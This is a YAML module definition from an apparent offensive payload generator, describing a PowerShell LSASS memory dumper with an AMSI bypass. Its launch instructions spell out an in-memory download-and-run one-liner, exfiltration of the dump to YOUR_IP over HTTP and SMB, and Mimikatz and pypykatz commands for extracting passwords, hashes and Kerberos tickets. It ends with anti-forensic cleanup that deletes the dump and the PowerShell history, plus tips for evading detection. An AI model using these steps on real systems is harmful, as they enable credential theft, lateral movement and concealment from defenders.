meta:
  name: "LSASS MiniDump Credential Dumper (PowerShell)*"
  category: "Credential Access"
  description: |
    Pure PowerShell script to dump LSASS process memory for offline credential extraction.

    Features:
    - AMSI bypass for execution
    - Reflective DLL loading (DbgHelp.dll)
    - Dynamic API resolution via reflection
    - MiniDumpWriteDump for memory dumping
    - No compilation required (pure PowerShell)
    - Configurable output path

    This script uses reflection to dynamically load and call Windows APIs, avoiding traditional PowerShell detection. The dumped file can be analyzed offline with Mimikatz or pypykatz to extract credentials.

    WARNING: For authorized security testing only! This technique is heavily monitored by EDR.

  effectiveness: "medium"

  mitre:
    tactic: "TA0006 - Credential Access"
    technique: "T1003.001 - OS Credential Dumping: LSASS Memory"

  artifacts:
    - "PowerShell process execution"
    - "AMSI bypass detection"
    - "OpenProcess on lsass.exe"
    - "MiniDumpWriteDump API calls"
    - "Large dump file creation (50-200 MB)"
    - "DbgHelp.dll loading"
    - "Sysmon Event ID 10 (ProcessAccess)"
    - "PowerShell Script Block Logging (if enabled)"

parameters:
  - name: "dump_path"
    type: "string"
    description: "Full path where LSASS dump file will be saved"
    required: true
    default: "C:\\Windows\\Tasks\\lsass.dmp"

  - name: "output_file"
    type: "string"
    description: "Output PowerShell script filename"
    required: false
    default: "dumper.ps1"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "credential_access/lsass_dump.ps1"
  compile:
    enabled: false
  launch_instructions: |
    # Transfer and Execute (In-Memory)

    ```powershell
    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:/{{ output_file }}')"
    ```

    # Alternative (File-Based Execution)

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```

    **Target:**
    ```powershell
    powershell -ep bypass -c "IWR -Uri http://YOUR_IP:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
    ```

    # Exfiltrate Dump File

    **Via HTTP:**
    ```bash
    python3 -m http.server 80
    ```
    ```powershell
    Invoke-WebRequest -Uri "http://YOUR_IP:/upload" -Method POST -InFile "{{ dump_path }}"
    ```

    **Via SMB:**
    ```bash
    impacket-smbserver share . -smb2support
    ```
    ```cmd
    copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
    ```

    # Extract Credentials

    **With pypykatz (Linux):**
    ```bash
    pypykatz lsa minidump lsass.dmp
    ```

    **With Mimikatz (Windows):**
    ```cmd
    mimikatz.exe
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonPasswords full
    ```

    # Notes

    - Dump path: `{{ dump_path }}` (typically 50-200 MB)
    - Includes AMSI bypass for in-memory execution
    - Uses reflection to dynamically resolve APIs (evades static detection)
    - Requires Administrator privileges or SeDebugPrivilege
    - MiniDumpWriteDump with type 2 (full memory dump)
    - Extracts plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials
    - **HEAVILY monitored by EDR/AV - high detection rate**
    - PowerShell Script Block Logging will record execution (Event ID 4104)
    - Consider alternatives: comsvcs.dll method, Volume Shadow Copy, process cloning, syscalls

    # Troubleshooting

    - **Access Denied:** Run as Administrator or with SeDebugPrivilege
    - **AMSI blocks:** Script includes bypass; if still blocked, obfuscate with Invoke-Obfuscation
    - File creation fails: Check disk space and path permissions
    - No credentials extracted: LSASS may be protected (PPL - Protected Process Light)
    - EDR blocks: Expected; this technique is well-known to defenders
    - Sysmon Event ID 10 (ProcessAccess) will fire when accessing LSASS

    Cleanup:
    On target:
    $ Remove-Item {{ dump_path }} -Force
    $ Remove-Item {{ output_file }} -Force
    $ Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
